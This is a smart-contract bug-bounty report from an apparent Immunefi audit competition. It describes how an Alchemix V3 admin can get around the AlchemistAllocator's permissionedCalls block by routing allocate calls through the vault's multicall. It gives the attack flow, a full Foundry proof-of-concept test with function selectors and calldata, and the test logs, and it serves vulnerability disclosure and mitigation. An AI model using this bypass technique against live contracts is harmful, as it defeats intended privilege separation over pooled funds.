# 57770 sc medium admin can bypass permissionedcalls protection using multicall

**Submitted on Oct 28th 2025 at 19:40:56 UTC by @nem0thefinder for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57770
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistAllocator.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value
  * permissionedCalls\` Protection can be bypassed

## Description

## Summary

The `AlchemistAllocator` contract blocks direct calls to `allocate()` and `deallocate()` functions through its `proxy()` function. However, an admin can bypass this protection by wrapping these calls inside the vault's `multicall()` function, completely defeating the intended privilege separation.

## Description

In `alchemistAllocator` constructor set `MorpheusVault::Allocate,Deallocate` functions as permissioned calls to prevent calling them directly from the `permissionedProxy`

```solidity
AlchemistAllocator.sol
constructor(address _vault, address _admin, address _operator) {
    // Block direct allocate/deallocate calls via proxy
    permissionedCalls[0x5c9ce04d] = true; // allocate
    permissionedCalls[0x4b219d16] = true; // deallocate
}
```

The issue here that the admin can bypass this through calling `MorpheusVault::multiCall` and route the calls to `Morphues::Allocate,dellocate` and since `multiCall` is not permissionedCall the call will succeed

```solidity
VaultV2.sol
// Vault has a multicall function (NOT blocked)
function multicall(bytes[] calldata data) external {
    for (uint256 i = 0; i < data.length; i++) {
        (bool success,) = address(this).delegatecall(data[i]);
        require(success);
    }
}
```

### Attack Flow

```
1. Admin calls: allocator.proxy(vault, multicall([allocate_calldata]))
2. proxy() extracts selector → 0xac9650d8 (multicall)
3. permissionedCalls[0xac9650d8] = false → Check passes ✓
4. proxy() calls: vault.multicall([allocate_calldata])
5. multicall() does: delegatecall(allocate_calldata)
6. allocate() executes with msg.sender = allocator address
7. isAllocator[allocator] = true → Access check passes ✓
8. Funds allocated successfully → BYPASS COMPLETE
```

## Impact

* **Defeats Security Model**: The entire `permissionedCalls` protection is bypassed
* **AlchemistAllocator Logic**:This path Ignore any custom logic, checks, or accounting in the `AlchemistAllocator`

## Mitigation

1. Add multicall selector to permissionedCalls if we don't need to call it via proxy OR
2. Restrict calling `allocate`and `deallocate` from `multicall`

## Proof of Concept

## Proof of Concept

### 1.Paste the following test in `AlchemistAllocator.t.sol`

```solidity
    function test_byPass_permissionedCalls() public {
        console.log("\n");
        console.log("==================================================================================");
        console.log("  PoC: Bypassing permissionedCalls Protection via Multicall");
        console.log("==================================================================================");
        console.log("");

        // Setup
        require(vault.adaptersLength() == 1, "adaptersLength must be 1");
        _magicDepositToVault(address(vault), user1, 100 ether);

        console.log("[SETUP]");
        console.log("  Vault balance:        ", vault.totalAssets() / 1e18, "tokens");
        console.log("  Admin address:        ", admin);
        console.log("  Allocator address:    ", address(allocator));
        console.log("  Strategy address:     ", address(mytStrategy));
        console.log("");

        vm.startPrank(admin);

        // ============================================================================
        // STEP 1: Demonstrate that direct allocate call via proxy is BLOCKED
        // ============================================================================
        console.log("[STEP 1] Attempting DIRECT allocate call via proxy (should fail)");
        console.log("---------------------------------------------------");

        bytes memory allocateData = abi.encodeWithSelector(
            0x5c9ce04d, // allocate(address,bytes,uint256) selector
            address(mytStrategy),
            abi.encode(""), // empty adapter data
            100 ether
        );

        console.log("  Function selector:    0x5c9ce04d (allocate)");
        console.log("  permissionedCalls[0x5c9ce04d]: TRUE (blocked)");
        console.log("  Expected result:      REVERT");
        console.log("");

        // This will REVERT because allocate selector is blocked
        vm.expectRevert();
        allocator.proxy(address(vault), allocateData);

        console.log("  Result: REVERTED as expected");
        console.log("  Protection working correctly for direct calls ");
        console.log("");

        // ============================================================================
        // STEP 2: Demonstrate the BYPASS using multicall
        // ============================================================================
        console.log("[STEP 2] Attempting allocate call via proxy->Vault::multicall (BYPASS)");
        console.log("---------------------------------------------------");

        bytes32 allocationId = mytStrategy.adapterId();
        uint initialAllocation = vault.allocation(allocationId);
        console.log("  Initial allocation:   ",  initialAllocation/ 1e18, "tokens");
        assertEq(initialAllocation,0);
        console.log("");

        // Prepare the inner allocate calldata
        bytes memory allocateCalldata = abi.encodeWithSelector(
            0x5c9ce04d, // allocate(address,bytes,uint256)
            address(mytStrategy),
            abi.encode(""), // adapter data
            100 ether
        );

        // Wrap it in multicall
        bytes[] memory calls = new bytes[](1);
        calls[0] = allocateCalldata;

        bytes memory multicallData = abi.encodeWithSelector(
            0xac9650d8, // multicall(bytes[]) -> cast sig "multicall(bytes[] calldata data)"
            calls
        );

        // Execute the bypass
        console.log("  Executing bypass...");
        allocator.proxy(address(vault), multicallData);
        console.log("  Result: SUCCESS (no revert)");
        console.log("");

        // ============================================================================
        // STEP 3: Verify the bypass was successful
        // ============================================================================
        console.log("[STEP 3] Verifying state changes");
        console.log("---------------------------------------------------");

        uint256 mytStrategyYieldTokenBalance = IMockYieldToken(mockStrategyYieldToken).balanceOf(address(mytStrategy));
        uint256 mytStrategyYieldTokenRealAssets = mytStrategy.realAssets();
        uint256 finalAllocation = vault.allocation(allocationId);

        console.log("  Strategy token balance:", mytStrategyYieldTokenBalance / 1e18, "tokens");
        console.log("  Strategy real assets:  ", mytStrategyYieldTokenRealAssets / 1e18, "tokens");
        console.log("  Vault allocation:      ", finalAllocation / 1e18, "tokens");
        console.log("");

        // Assertions
        assertEq(mytStrategyYieldTokenBalance, 100 ether, "Strategy token balance mismatch");
        assertEq(mytStrategyYieldTokenRealAssets, 100 ether, "Strategy real assets mismatch");
        assertEq(finalAllocation, 100 ether, "Vault allocation mismatch");

        console.log("  All state changes verified");
        console.log("");

        // ============================================================================
        // SUMMARY
        // ============================================================================
        console.log("==================================================================================");
        console.log("  SUMMARY: VULNERABILITY CONFIRMED");
        console.log("==================================================================================");
        console.log("");
        console.log("   Direct allocate call via proxy:     BLOCKED (as intended)");
        console.log("   Multicall-wrapped allocate via proxy: SUCCEEDED (bypass!)");
        console.log("==================================================================================");
        vm.stopPrank();
    }
```

### 2.Run it via `forge test --mc AlchemistAllocatorTest --mt test_byPass_permissionedCalls -vvv`

### Logs

```
Logs:
  

  ==================================================================================
    PoC: Bypassing permissionedCalls Protection via Multicall
  ==================================================================================
  
  [SETUP]
    Vault balance:         100 tokens
    Admin address:         0x2222222222222222222222222222222222222222
    Allocator address:     0x894bcfD2EEd71B2082101dC85F86865824eFB62D
    Strategy address:      0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
  
  [STEP 1] Attempting DIRECT allocate call via proxy (should fail)
  ---------------------------------------------------
    Function selector:    0x5c9ce04d (allocate)
    permissionedCalls[0x5c9ce04d]: TRUE (blocked)
    Expected result:      REVERT
  
    Result: REVERTED as expected
    Protection working correctly for direct calls 
  
  [STEP 2] Attempting allocate call via proxy->Vault::multicall (BYPASS)
  ---------------------------------------------------
    Initial allocation:    0 tokens
  
    Executing bypass...
    Result: SUCCESS (no revert)
  
  [STEP 3] Verifying state changes
  ---------------------------------------------------
    Strategy token balance: 100 tokens
    Strategy real assets:   100 tokens
    Vault allocation:       100 tokens
  
    All state changes verified
  
  ==================================================================================
    SUMMARY: VULNERABILITY CONFIRMED
  ==================================================================================
  
     Direct allocate call via proxy:     BLOCKED (as intended)
     Multicall-wrapped allocate via proxy: SUCCEEDED (bypass!)
  ==================================================================================

```
